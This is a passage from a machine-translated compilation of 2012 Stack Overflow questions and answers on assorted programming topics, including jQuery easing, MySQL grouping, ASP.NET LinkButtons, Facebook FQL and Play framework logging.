/*** THIS IS THE VIEWCONTROLLER WHERE I IMPLEMENT THE CUSTOM ALERTVIEW ***/

    #import "NetworkSelectorViewController.h"

@interface NetworkSelectorViewController ()

@end

@implementation NetworkSelectorViewController
@synthesize delegate, alert;
-(void)add {

    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(resizeTaxonomyView:) name:@"resizeTaxonomyView" object:nil];
    alert = [[AlertTableViewController alloc] initWithCaller:self data:sources title:@"New Network" andContext:nil];
    //UIAlertView * alert = [[UIAlertView alloc] initWithTitle:[NSString stringWithFormat:@"%@ %@", NSLocalizedString(@"button.new", nil), self.title] message:@"" delegate:self cancelButtonTitle:NSLocalizedString(@"button.cancel", nil) otherButtonTitles:NSLocalizedString(@"button.save", nil), nil];
    //alert.alertViewStyle = UIAlertViewStylePlainTextInput;
    //UITextField * alertTextField = [alert textFieldAtIndex:0];

    //UITableView *tableView = [[UITableView alloc] initWithFrame:CGRectMake(11, 110, 261, 200) style:UITableViewStylePlain];
    //UIButton* okButton = [[UIButton alloc] initWithFrame:CGRectMake(11, 30, 50, 50)];
    //[alert addSubview:okButton];
    //okButton.frame = CGRectMake(okButton.frame.origin.x, 400, okButton.frame.size.width, okButton.frame.size.height);
    //alertTextField.keyboardType = UIKeyboardTypeAlphabet;
    //alertTextField.placeholder = self.title;
    //[alert addSubview:tableView];
    //alert.data = [[NSArray alloc] initWithObjects:@"1",@"2", nil];
    alert.delegate = self;
    NSLog(@"ALERT SUBVIEWS: %@", alert.subviews);
    [alert show];

    alert.frame = CGRectMake(alert.frame.origin.x, alert.frame.origin.y, alert.frame.size.width, 370);
    NSLog(@"X:%f Y:%f W:%f H:%f", alert.frame.origin.x, alert.frame.origin.y, alert.frame.size.width, alert.frame.size.height);
    UIButton* button1 = (UIButton*)[alert.subviews objectAtIndex:2];
    button1.frame = CGRectMake(0,300, 50, button1.frame.size.height);
    //[alert release];

}

- (void)resizeTaxonomyView:(NSNotification *)notification {

    // El mÈtodo recibe un objeto de tipo NSNotification cuya propiedad object
    // alberga el objeto pasado como parametro. En este caso hacemos un casting
    // del objeto a NSString.
    if(UIInterfaceOrientationIsLandscape(self.interfaceOrientation))
        alert.frame = CGRectMake(alert.frame.origin.x, alert.frame.origin.y, alert.frame.size.width, 500);
    else
        alert.frame = CGRectMake(alert.frame.origin.x, alert.frame.origin.y, 500, 1000);

} 
```

NSnotification 有效，方法触发，但 alertview 不自动调整大小

[uialertview自定义](/questions/tagged/uialertviewcustom "显示标记为“uialertviewcustom”的问题")

# javascript - 简化 JS/JQuery 中的执行流程

> ID：13514931
> 
> 赞同：2
> 
> 时间：2012-11-22T14:36:17.430
> 
> 标签：javascript, jquery

简化 JS/JQuery 中的执行流程我有这样的循环：

```
for (int i = 0; i < 100; i++)
{ 
   doSomething(...); // returns momentally
} 
```

我正在寻找一种将缓动应用于执行流程的方法 - 通过给出总持续时间和缓动模式（例如 2 秒和缓动）。在 JS 中是否可行（我也在使用 jQuery）？

* * *

**更新 2**更新以澄清问题 - 我正在寻找以下内容：

**更新 3** - Sheikh Heera 是对的，我给出的示例并没有说明真正的问题，执行函数被更新为调用外部模块，这更接近我所拥有的。我看不到 jQuery 的动画如何直接应用于调用函数。

```
easer.ease({ start: 0, 
   end: 100, 
   duration: 900, 
   easing: "easeOutBounce",
   execute: function (e) { ExternalModule.DoSomethingUseful(e); } }); 
```

其中`start`是`end`整数，指定动画范围，`duration`是以毫秒为单位的动画持续时间，`easing`是用于为范围内的值设置动画的缓动模式， -使用从to`execute`的值调用的函数，使用上面示例中提供的缓动模式将使用缓动功能在几秒钟内将 myDiv 的高度从 动画 动画。`0``100``0``100``0.9``easeOutBounce`

理想情况下，作为一个基于 的小型独立插件`jQuery`，绝对不是`Mootools`我无法负担的任何其他重量级人物的一部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:43:27.140

如果我正确理解您的问题....您可以尝试使用 .delay(100) 或 .delay(xmilliseconds) ，这样每一步都需要更长的时间。

阅读更多关于延迟的信息： http: [//api.jquery.com/delay/](http://api.jquery.com/delay/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-01T10:15:01.210

尽我所能，我尝试使用 jQuery“动画”属性来实现你想要的东西。

使用此 jQuery 属性将允许您根据需要添加“缓动”、“持续时间”、“回调”等。我使用“step”属性来实现这一点。

为了工作，您需要在 HTML 中添加一个“虚拟”标签并将其隐藏。

## 演示：http: [//jsfiddle.net/vaakash/Wtqm3/](http://jsfiddle.net/vaakash/Wtqm3/)

**HTML**

```
<!-- Add a dummy tag to apply animate property -->
<span class="holder" style="display:none" ></span>​ 
```

**jQuery**

```
$('.holder').animate(
    {
        'end': 100 // There is no such "end" css property just using as an end mark
    },
    {
        duration: 500,
        step: function(now, fx) {
            myFunction(now); // Call your function here with the "now" param (i.e ExternalModule.DoSomethingUseful(now) ) in your case                      
        }
        // Add easing property if wanted
    }
);

// The function
function myFunction(param){
    $('body').append('Value now: ' + param + '</br/>');
}​ 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-01T20:02:57.897

## jQuery中的缓动

jQuery 只有两个缓动，线性和摆动。您正在寻找的是 jQuery UI 中使用的函数。它们可以从`$.easing`.

[**$.easing 演示**](http://jsfiddle.net/sinetheta/R3NRC/)，您可以在其中玩它们。

你可以通过 name 调用任何你想要的函数`$.easing.easeOutBounce(e, t, n, r)`。唯一令人困惑的部分是它们实际上是 4 个变量函数。来自 jQuery UI 文档：

> 基于Robert Penner的[缓动方程](http://www.robertpenner.com/easing)

使用它们的“标准”方式`f(x, 0, 0, 1)`是`e`我们通常想要更改的变量。`n`似乎是大多数功能的“起点”，`t`看起来是其中许多功能的“力量”，以及`r`线性比例因子。

### 免责声明

这只是我查看 jquery 和 jquery-ui 源文件的最佳猜测。如果你想做缓动，我建议你只编写自己的函数，而不是依赖肯定不属于稳定 API 的内部部分。

## 你的缓动功能

虽然我不建议制作这样的函数，但这*是*一个有趣的实验。[演示](http://jsfiddle.net/sinetheta/LBPMG/)。

```
var ease = function(options) {
    var t = 0;
    // we need a time interval for animating
    var tstep = options.interval || 10;
    var duration = options.duration || 500
    var i = options.start || 0;
    var end = options.end || 100;
    // the easing functions only work over x=0..1
    var scale = end - i;
    //  one divided by the number of tsteps
    var interval = tstep/duration;
    var easing = options.easing || 'linear';
    var callback = options.execute || function(){}; 
    var timeout = function() {
        // we call the callback but pass it the scale result of our easing
        callback(scale*$.easing[easing](Math.min(i, 1)));
        // if we haven't reached the end of the animation, queue up another frame
        if (t <= duration) {
            window.setTimeout(function() {       
                 timeout();
            }, tstep);
            i += interval;
            t += tstep;
        }
    };
    timeout();
};

ease({
    start: 0,
    end: 100,
    duration: 900,
    easing: 'easeOutBounce',
    // we'll print to the screen the results of the easing
    execute: function(e) {$('body').append('<p>' + e)}
}); 
```

# javascript - 如果在外部单击，则隐藏 div

> ID：13514932
> 
> 赞同：2
> 
> 时间：2012-11-22T14:36:20.527
> 
> 标签：javascript, jquery

我在使用这个 JQuery 函数时遇到了一些问题。

基本上，我有一个 div，单击它时会显示另一个 div。实际上，它设置为切换，因此当您单击时它会打开/关闭。

我想要它，如果您单击打开的 div 之外的任何位置（单击第一个 div 后出现），则打开的 div 将关闭。

```
$("#idSelect").click(function() {
   $("#idDiv").toggle();
}); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T14:39:21.410

**编辑：**这里有一个更好的方法：
[如何创建自定义模式弹出窗口 - 以及如何在外部单击关闭它](https://stackoverflow.com/questions/23283652/close-display-block-divs-if-open-by-clicking-anywhere-on-body)

* * *

~~[jsBin 演示](http://jsbin.com/alajaz/1/edit)~~

```
$( "#idSelect" ).click(function( e ) {
   e.stopPropagation();
   $("#idDiv").toggle();
});

$( "#idDiv" ).on('click',function( e ) {
     e.stopPropagation();
});

$( document ).on('click', function( e ) {
   if( e.target.id != 'idDiv' ){
       $( "#idDiv" ).hide();
   }   
}); 
```

 ~~* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:38:33.173

希望这可以帮助：

```
$(document).click(function() {
   if($(window.event.target).attr('id') != 'idSelect')
       $("#idDiv").hide();
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T14:39:37.723

```
$(document).on("click",function(e) {
   if ($(e.target).is("#idDiv, #idDiv *"))
       $("#idDiv").show();
   else
       $("#idDiv").hide();
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T14:47:01.697

[**jQuery-outside-events**](http://benalman.com/projects/jquery-outside-events-plugin/)插件增加了对以下事件的支持

> clickoutside，dblclickoutside，focusoutside，bluroutside，mousemoveoutside，mousedownoutside，mouseupoutside，mouseoveroutside，mouseoutoutside，keydownoutside，keypressoutside，keyupoutside，changeoutside，selectoutside，submitoutside。

应用于您的案例，您可以做到

```
 $("#idDiv").on("clickoutside", function( ) {
        $("#idDiv").hide();
    });

    $("#idSelect").on("click", function( e ) {
        $("#idDiv").toggle();
        e.stopPropagation();
    }); 
```

演示[**在这里**](http://jsfiddle.net/bruno/cpDHg/1/)~~

# javascript - 未来 2 天的 Javascript 日期

> ID：13514933
> 
> 赞同：0
> 
> 时间：2012-11-22T14:36:22.160
> 
> 标签：javascript, date

我使用此代码显示接下来的 2 天

```
var mydate= new Date();
mydate.setDate(mydate.getDate()+2)
document.write("Tomorrow Date :" +mydate.getDate()+"/"+(mydate.getMonth()+1)+"/"+mydate.getFullYear()); 
```

它给了我一个正确的日期，但我希望它具有这种格式示例：Jan-01-2012。

谁可以帮我这个事？我尝试使用这个字符串`mydate.format('mmm,d,y');`，它没有返回。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:48:26.120

`Date`使用本机 javascript API格式化 a 是不可能的。

本机 API 唯一可能的输出是 , , , , , , , , 的`d`组合`dd`，`ddd`以及`M`使用`MM`and`MMM`方法`y`和`yy`正`yyyy`则`toString()`表达式`get*()`。

所以更好的解决方案是使用第三方库，比如[moment.js](http://momentjs.com/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:48:39.750

您应该查看`toLocaleString()`将 a 的结果转换为`Date()`尊重语言环境约定的字符串，[如此处所述](http://www.w3schools.com/jsref/jsref_tolocalestring.asp)。

如果您*真的*需要特定的东西，您需要构建一个数组，如此[处所示](http://www.w3schools.com/jsref/jsref_getmonth.asp)。

# jquery-ui - jquery droppable - 嵌套 div，获取目标 id

> ID：13514938
> 
> 赞同：0
> 
> 时间：2012-11-22T14:36:40.933
> 
> 标签：jquery-ui, droppable, jquery-ui-droppable, jquery-droppable

我有这样的事情：

```
$('#mover' ).draggable({});
$('div').droppable({
    drop: function(event, ui) {
        console.log(event.target.id)
    } 
```

然后

```
<div id="container">
    <div id="target_1"></div>
    <div id="target_2"></div>
    <div id="target_3"></div>
</div> 
```

当我将移动器放在 div 上时，“容器”会返回。我如何返回该项目被丢弃的最低孩子？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:28:48.673

我知道实际问题的解决方案：我试图将一个元素放在它来自的同一个 div 上。

# mysql - 如何将一个表中的行合并到另一个表中的另一行

> ID：13514943
> 
> 赞同：0
> 
> 时间：2012-11-22T14:37:05.520
> 
> 标签：mysql, sql

我想将一个表中的行合并到另一个表中的另一行

与“姓名”相关的“金额”始终值大于 10，但拆分为几块

如果“金额”列的值小于 10，则收集所有小于 10 的值，将具有相同名称的“描述”列的值汇集在一起

我的目标是在新表中不存在低于 10 的行“金额”

又名

我想要这个表格 - 'table'

> id(1) 名称(Name1) 描述(Description1) 金额(5.50)
> 
> id(2) 名称(Name1) 描述(Description2) 金额(5.50)
> 
> id(3) 名称(Name2) 描述(Description1) 金额(3.50)
> 
> id(4) 名称(Name2) 描述(Description1) 金额(3.50)
> 
> id(5) 名称(Name2) 描述(Description2) 金额(3.50)
> 
> id(6) 名称(Name3) 描述(Description3) 金额(10.00)

在一个新表中进入这个 - 'newtable'

> Newid(1) 名称(Name1) 描述(Description1,Descripton2) 金额(11.00)
> 
> Newid(2) 名称(Name2) 描述(Description1,Description1,Descripton2) 金额(10.50)
> 
> Newid(3) 名称(Name3) 描述(Description3) 金额(10.00)

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:43:18.973

您可以使用`group by`,[`group_concat`](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html)并[`sum`](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_sum)为此。

这是一个小样本：

```
SELECT
`name`,
group_concat(`description`) as `description`,
sum(`amount`) as `amount` 
FROM `table_name`
GROUP BY `name` 
```

顺便说一句，我忘了问：[你试过什么？](http://whathaveyoutried.com)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:47:51.653

也许是这样的：

```
select into newtable(name,newdesc,amt)
SELECT name,
        GROUP_CONCAT(DISTINCT description
                  ORDER BY id DESC SEPARATOR ' '), sum(amount)
     FROM table
     GROUP BY name; 
```

# asp.net - 如何获取之前在 Repeater 控件中单击的 LinkBut ton 的 ID？

> ID：13514948
> 
> 赞同：2
> 
> 时间：2012-11-22T14:37:19.350
> 
> 标签：asp.net, c#-4.0

我有一个中继器控件，其中包含一个`LinkButton`。使用命令参数，我在代码隐藏中执行必要的功能。我想在单击 a`LinkButton`后将其前景色变为红色，如果在 中单击另一个`LinkButton`，`Repeater`我想将先前单击的前色关闭`LinkButton`为黑色，将最近单击的前色关闭为红色。我怎么做？这是我的代码：

```
<asp:Repeater ID="Repeater1" runat="server">
    <HeaderTemplate>
        <ul>
    </HeaderTemplate>
    <ItemTemplate>
            <li>
                <asp:LinkButton ID="LinkButton1" runat="server" Text='<%#Eval("divisionlabel") %>'
                                OnCommand="LinkButton1_Command" CommandName="MyPendingApps" CommandArgument='<%#Eval("divisionid") %>'>
                </asp:LinkButton>
            </li>
    </ItemTemplate>
    <FooterTemplate>
            <li>
                <asp:LinkButton ID="LinkButton_InsReqList" runat="server" OnCommand="LinkButton_InsReqList_Command"
                                CommandName="InspectionRequests">Inspection Requests List</asp:LinkButton>
            </li>
        </ul>
    </FooterTemplate>
</asp:Repeater> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T16:23:41.983

`OnClick="LinkButtons_Click"`在表单上的每个链接按钮中添加一个

```
<asp:Repeater ID="Repeater1" runat="server">
    <HeaderTemplate>
        <ul>
    </HeaderTemplate>
    <ItemTemplate>
            <li>
                <asp:LinkButton ID="LinkButton1" runat="server" Text='<%#Eval("divisionlabel") %>'
                                OnCommand="LinkButton1_Command" CommandName="MyPendingApps" CommandArgument='<%#Eval("divisionid") %>' OnClick="LinkButtons_Click">
                </asp:LinkButton>
            </li>
    </ItemTemplate>
    <FooterTemplate>
            <li>
                <asp:LinkButton ID="LinkButton_InsReqList" runat="server" OnCommand="LinkButton_InsReqList_Command"
                                CommandName="InspectionRequests" OnClick="LinkButtons_Click">Inspection Requests List</asp:LinkButton>
            </li>
        </ul>
    </FooterTemplate>
</asp:Repeater> 
```

该函数的代码是：

```
protected void LinkButtons_Click(object sender, EventArgs e)
{
    LinkButton link=(LinkButton)sender;
    if (link.ID == "yourDesiredID1")
    {
           link.ForeColor=System.Drawing.Color.Red; 
    }
    else
    {
           link.ForeColor=System.Drawing.Color.YourDefaultdColor; 
    }
    if (link.ID == "yourDesiredID2")
    {
           link.ForeColor=System.Drawing.Color.Yellow; 
    }
    else
    {
           link.ForeColor=System.Drawing.Color.YourDefaultColor; 
    }
    if (link.ID == "yourDesiredID3")
    {
           link.ForeColor=System.Drawing.Color.Blue; 
    }
    else
    {
           link.ForeColor=System.Drawing.Color.YourDefaultColor; 
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T16:05:56.177

我会在 ViewState 中存储来自 ItemCommand 事件服务器端的唯一标识符（值、Id、ItemIndex 等），然后在 ItemDataBound 事件中检查唯一标识符是否等于 ViewState 中的值，如果它确实应用了更改的类文字颜色为红色，如果不进行绑定。

显然这里有一些你需要考虑的细节，但它是一个开始。

# c - GTK3-lib 窗口在 Ubuntu 中为空

> ID：13514952
> 
> 赞同：1
> 
> 时间：2012-11-22T14:37:25.850
> 
> 标签：c, ubuntu-12.04, gtk3

我想编译和运行如何将 GTK3 库用于我的 C 程序的示例，但是当我运行它们时，它们只包含一个空白区域（没有按钮或文本）。

我正在运行带有 GTK-3.0 的 Ubuntu 12.04

我尝试编译和运行的一些示例如下：http: [//developer.gnome.org/gtk3/3.0/gtk-getting-started.html](http://developer.gnome.org/gtk3/3.0/gtk-getting-started.html)

`pkg-config --cflags --libs gtk+-3.0` 运行二进制文件时，GCC 不会输出带有标志的错误或警告，也不会发出警告。

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T03:56:34.847

行。问题有点解决了。

我格式化了我的 Ubuntu 驱动器并安装了新版本 12.10 - 这并没有改变任何东西！解决我的问题的是也安装 GTK 2.0，即使我使用 GTK3 标志进行编译，并且原始帖子中提到的教程是针对 GTK3 的。

如果没有人解释，我将其报告为错误。

# excel - 来自工作表列的 VBA 多列列表框

> ID：13514953
> 
> 赞同：2
> 
> 时间：2012-11-22T14:37:28.613
> 
> 标签：excel, vba, listbox

我有一个包含两张工作表的电子表格，我们称它们为工作表 A 和工作表 B。

在工作表 A 中，我单击一个按钮，它会打开一个带有列表框的表单。工作表 B 有 10 列数据。

我想选择其中的 3 个列内容（A、B、F）。

并将它们显示在不同列的这个列表框中，但它只是不起作用并且找不到正确的方法来执行此操作..

这是我到目前为止所拥有的：

git://gist.github.com/4131461.git

所以最后我想要一个包含 3 列的列表框，每列填充 3 列的 1-10 范围..

我刚开始做VBA，我不知道该怎么做..

帮助？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-22T14:51:48.720

lbData 是列表框，根据需要更改 Sheet2 以引用您的数据。在用户表单中添加以下内容：

```
Private Sub UserForm_Initialize()

    With Me.lbData
        .ColumnCount = 3
        .ColumnWidths = "33;33;33"
        .RowSource = Sheet2.Range("A1:C10").Address
    End With

End Sub 
```

# android - 适用于 Android 的 Mono 显示没有设备

> ID：13514957
> 
> 赞同：0
> 
> 时间：2012-11-22T14:37:41.787
> 
> 标签：android, visual-studio-2010, debugging, mono, visual-studio-2012

我有一个 Android 版 Mono 的注册版本。如果我尝试在私人 PC 上的手机 (Galaxy S3) 上进行调试，一切正常。但是，如果我在我的好友 PC 上尝试它，它不起作用。我不知道我是否忘记了什么。

我做了什么：

*   安装驱动程序 (Kies)
*   USB调试已打开
*   重启VS 2012

希望，任何人都可以帮助我...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T15:29:58.833

尝试关闭**使用快速部署（仅限调试模式）**

您可以在项目的属性 -> Mono Android 选项中找到它。

# javascript - 如何隐藏超链接下划线并保持javascripts中的原始字体颜色？

> ID：13514960
> 
> 赞同：-1
> 
> 时间：2012-11-22T14:37:56.760
> 
> 标签：javascript, css, hyperlink

如何通过避免在 JavaScript 中更改为蓝色字体来隐藏超链接下划线并保持原点。我的 JavaScript 代码：

```
<a href="javascript:window.open('selectprofiletype.php','Crm.com - Create',
'width=700,height=350' ) ">&nbsp;&nbsp;User Profile</a> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:41:03.537

为什么是 JavaScript？使用 CSS。

```
a {
  text-decoration: none;
  color: black;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:41:14.913

希望这可以帮助：

```
a {
    color: #0060B6;
    text-decoration: none;
}

a:hover 
{
     text-decoration:none; 
     color: #0060B6;
     cursor:pointer;  
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T14:57:07.593

请将 JavaScript 更改为以下内容（并使用 CSS 的任何其他答案，而不是使用内联样式）

```
<a href="selectprofiletype.php" target="crm_create" style="text-decoration:none"
onclick="var w = window.open(this.href,this.target,'width=700,height=350');
  return w?false:true;">&nbsp;&nbsp;User Profile</a> 
```

因为您的代码会在多个浏览器中出现问题 - 例如窗口名称可能没有空格

如果不显眼，代码会更好：

```
window.onload=function() {
 document.getElementById("crm").onclick=function() {
  var w = window.open(this.href,this.target,'width=700,height=350');
  return w?false:true;
 }
} 
```

只使用

```
<a id="crm" href="selectprofiletype.php" target="crm_create">User Profile</a> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T14:41:29.423

这似乎更像是一个`css`问题

```
a{
text-decoration: none; 
color: your colour here;
} 
```

# python - 在 wxPython 中使用 wxCode 小部件（如 wxScintilla、wxPlotCtrl）

> ID：13514963
> 
> 赞同：0
> 
> 时间：2012-11-22T14:38:01.363
> 
> 标签：python, wxpython, wxwidgets, wxglade

美好的一天。

我正在用 python 编写我的开源应用程序，并为 gui 选择了 wxPython。我提到 wxWidgets 有一组出色的自定义控件，称为 wxCode: (http://wxcode.sourceforge.net/)，因此我有一个问题：

有没有办法将它们与 wxPython 一起使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T02:42:57.707

是的。

**闪烁**：

[http://www.wxpython.org/docs/api/wx.stc.StyledTextCtrl-class.html](http://www.wxpython.org/docs/api/wx.stc.StyledTextCtrl-class.html)

[http://www.yellowbrain.com/stc/index.html](http://www.yellowbrain.com/stc/index.html)

**wx.lib.plot**：

[http://www.wxpython.org/docs/api/wx.lib.plot-module.html](http://www.wxpython.org/docs/api/wx.lib.plot-module.html)

# android - 如何在不进行列表搜索的情况下知道是否喜欢该帖子

> ID：13514972
> 
> 赞同：3
> 
> 时间：2012-11-22T14:38:24.483
> 
> 标签：android, facebook, facebook-graph-api

我尝试使用 fql 查询来获取 json 响应，我使用此代码来执行此操作

```
 String postid=jsonObject.getString("id");

   String query = "SELECT likes.user_likes FROM stream WHERE post_id = \'" + postid + "'";

    Bundle params = new Bundle();
   params.putString("method", "fql.query");
    params.putString("query", query);

   String fqlResponse = Utility.mFacebook.request(params);

   System.out.println(fqlResponse); 
```

但我在 Utility.mFacebook.request(params); 处收到空指针异常；

我在 Github 中使用默认类

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:59:36.897

我个人觉得 Facebook Graph API 有时有点不足。例如，在您当前的需求中，如果您只需要使用 Graph API，您将需要首先获取所有喜欢特定帖子的用户的列表。获得列表后，您必须检查用户 ID 是否与登录用户的 ID 匹配，然后根据结果运行函数或其他内容。

相反，FQL 提供了更简单的功能。在我的应用程序中，对于完全相同的功能，我专门使用 FQL。

您可以触发一个简单的查询。例如：

```
SELECT likes.user_likes FROM stream WHERE post_id ='XXXXXXXXXXXXX_XXXXXXXXX' 
```

将 X 替换为 Post 的 ID。**确保用“YOUR_POST_ID”**将帖子 ID括起来

 **在 Graph API Explorer 中这样尝试：`fql?q=SELECT likes.user_likes FROM stream WHERE post_id = 'ENTER_YOUR_POST_ID'`

运行查询后，您应该得到如下所示的结果：

```
{
  "data": [
    {
      "likes": {
        "user_likes": true
      }
    }
  ]
} 
```

如果用户喜欢帖子，如果用户不喜欢帖子，则该字段`user_likes`将为*真*和*假*。

您可以像这样解析结果（伪代码）：

```
if (JOLikeStatus.has("likes")) {
    JSONObject optLikes = JOLikeStatus.optJSONObject("likes");

    if (optLikes.has("user_likes")) {
        String getUserLikes = optLikes.getString("user_likes");

        if (getUserLikes.equals("true")) {
            String getLikeStatus = "true";
        } else if (getUserLikes.equals("false")) {
            String getLikeStatus = "false";
        }
    } else {
        String getLikeStatus = null;
    }
} else {
    String getLikeStatus = null;
} 
```

**编辑 2：**要获得总喜欢的数量（计数），请修改前面的查询，如下所示： `fql?q=SELECT likes.user_likes, likes.count FROM stream WHERE post_id = 'ENTER_YOUR_POST_ID'`**

# javascript - Xpages - 在重复控件中显示过滤的文档集合

> ID：13514975
> 
> 赞同：1
> 
> 时间：2012-11-22T14:38:29.433
> 
> 标签：javascript, xpages

我在重复控件的绑定数据部分中有以下代码。我已将集合名称称为“文档”。我似乎无法在视图控件中显示任何值。计算字段 - docs.getItemValue("Status")。有什么想法我哪里出错了吗？

```
var v:NotesView = database.getView("xpageReports");
viewScope.status=""

// Created After
var after = viewScope.crafter
if(after==null)after = @Date(2000, 1, 1, 0, 0, 0);  

// Created Before
var before = viewScope.crbefore 
if(before==null) before = @Date( @Tomorrow() );

// Build Date Range
var dr = session.createDateRange(after, before);

// Status
var status = viewScope.crstatus;
if(status =="-select-") status =""
// Department
var department = viewScope.crdepartment;
if(department =="-select-") department=""

// Unit
var unit = viewScope.crunit;
if(unit ="-select-") unit=""

var dc:NotesDocumentCollection = v.getAllDocumentsByKey(dr);
if (dc.getCount() == 0) {
    viewScope.status = "0";
    return;
}

var count = 0
var doc:NotesDocument = dc.getFirstDocument();
while (doc != null) {
    var tmpdoc = dc.getNextDocument();
    var remove = 0

    @If(status!="",@If(doc.getItemValueString("Status")!=status,remove = remove + 1,""),"")
    @If(department!="",@If(doc.getItemValueString("Department")!=department,remove = remove + 1,""),"")
    @If(unit!="",@If(doc.getItemValueString("Unit")!=unit,remove = remove + 1,""),"")
    if(remove!=0) dc.deleteDocument(doc)

    doc.recycle();

    doc = tmpdoc;

    }

return dc 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:41:09.753

我更改了代码以返回文档的 noteID，并将其放在重复控件的绑定数据部分中，并将集合名称设置为*docs*

```
var v:NotesView = database.getView("xpageReports");
var docIDs = ""

// Created After
var after = viewScope.crafter
if(after==null)after = @Date(2000, 1, 1, 0, 0, 0);  

// Created Before
var before = viewScope.crbefore 
if(before==null) before = @Date( @Tomorrow() );

// Build Date Range
var dr = session.createDateRange(after, before);

// Status
var status = viewScope.crstatus;
if(status =="-select-") status =""
// Department
var department = viewScope.crdepartment;
if(department =="-select-") department=""

// Unit
var unit = viewScope.crunit;
if(unit =="-select-") unit=""

var dc:NotesDocumentCollection = v.getAllDocumentsByKey(dr);
if (dc.getCount() == 0) {
    return;
}

var count = 0
var doc:NotesDocument = dc.getFirstDocument();
while (doc != null) {
    var tmpdoc = dc.getNextDocument();
    var remove = 0

    @If(status!="",@If(doc.getItemValueString("Status")!=status,remove = remove + 1,""),"")
    @If(department!="",@If(doc.getItemValueString("Department")!=department,remove = remove + 1,""),"")
    @If(unit!="",@If(doc.getItemValueString("Unit")!=unit,remove = remove + 1,""),"")
    if(remove==0) docIDs = docIDs = docIDs + doc.getNoteID()+";"

    doc.recycle();
    doc = tmpdoc;

}
return @Explode(docIDs,";") 
```

然后我在 repeat 控件内放置了一个面板，将数据源设置为文档的形式，并将 Document ID 字段设置为 computed 并输入*docs*。现在我放在面板中的任何计算字段都可以绑定到表单字段

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:44:38.680

据我了解您的问题，您希望在重复控件的视图中显示文档子集 - 您的过滤应该按日期范围完成。我通过使用以下逻辑完成了类似的事情：

1.  我的自定义控件/ xpage 的数据源是一个视图（在您的情况下是视图“xpageReports”），数据源名称为“view1”。
2.  在数据源属性中，您可以使用三个选项来缩小文档集的范围：“按类别名称过滤”、“按列值过滤”和“在视图结果中搜索”。就我而言，我使用了“在视图结果中搜索”（在具有全文索引的数据库中）。因此，您可以使用 JavaScript 创建如下查询：

`'[dateAfter]>=01.01.2000 AND [dateAfter]<=31.12.2012';`

1.  在重复中，您可以将源设置为“view1”

2.  集合名称可以设置为“mydoc”

3.  可以使用代码访问重复中计算字段中的列值

`mydoc.getColumnValue("PROGRAMMATICCOLUMNNAME");`

我希望这是对正确方向的暗示。据我了解，这应该符合您的要求。

# java - 使用 play logger 在 play framework 2.0.3 for java 中使用信息级别进行日志记录

> ID：13514984
> 
> 赞同：5
> 
> 时间：2012-11-22T14:38:49.040
> 
> 标签：java, playframework-2.0

我想通过在 logger.xml 中配置日志级别来控制日志记录。

我使用了在 logger.xml 中设置了级别 ERROR 的 play.Logger，但是级别为 INFO、DEBGU 的记录器也被记录了。

我用过**ALogger log = play.Logger.of(Application.class);** 在 logger.xml 中具有 INFO 级别，但仅记录错误日志。

我也尝试通过自定义信息和调试方法来创建自定义记录器类，但它没有成功。

我在任何论坛/社区页面中都没有找到任何解决方案。请指导我如何进一步进行。

下面是代码和logger.xml

```
package test

import play.mvc.Controller;
import play.mvc.Result;
import views.html.index;

public class Application extends Controller {

    public static Result index() {
        return ok(index.render("Rendering "));
    }

    public static Result ourApp() {
        ALogger log = play.Logger.of(Application.class);
        log.info("**** Info enabled *****");
        log.debug("**** debug enabled *****");
        log.error("**** error enabled *****");
        if(log.isDebugEnabled())
        {
            log.debug("**** Debug enabled *****");
        }
        if(log.isInfoEnabled())
        {
            log.info("**** Info enabled *****");
        }
        if(log.isErrorEnabled())
        {
            log.error("**** Error enabled *****");
        }
        return ok();
    }

    public static Result getXPage(String patId) {
        String xValue = TestDao.getXNotes(patId);
        return ok(test.render(Value));
    }
} 
```

**记录器.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <conversionRule conversionWord="coloredLevel" converterClass="play.api.Logger$ColoredLevel" />

  <appender name="FILE" class="ch.qos.logback.core.FileAppender">
     <file>${application.home}/logs/app.log</file>
     <encoder>
       <pattern>%date - [%level] - from %logger %n%message%n%xException%n</pattern>
     </encoder>
   </appender>

  <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">

    <encoder>
      <pattern>%date - [%level] - %logger{15} - %message%n%xException{5}</pattern>
    </encoder>
  </appender>

    <logger name="play" level="INFO" />
    <logger name="application" level="INFO" />

   <root level="ERROR">
    <appender-ref ref="STDOUT" />
    <appender-ref ref="FILE" />
  </root>
</configuration> 
```

**输出：-**

```
